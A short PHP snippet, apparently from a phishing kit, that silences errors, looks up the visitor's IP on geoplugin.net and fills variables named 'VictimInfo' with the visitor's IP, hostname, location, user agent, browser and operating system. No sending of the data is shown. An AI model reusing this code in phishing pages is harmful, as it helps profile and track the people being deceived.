<?php 
@error_reporting(0);
require "assets/includes/functions.php";
$ipDetails = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip), true);
    $VictimInfo1 = ""." ".$ip." (".gethostbyaddr($ip).")";
    $VictimInfo2 = ""."".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
    $VictimInfo3 = ""."".$systemInfo['useragent'];
    $VictimInfo4 = ""."".$systemInfo['browser'];
    $VictimInfo5 = ""."".$systemInfo['os'];

?>

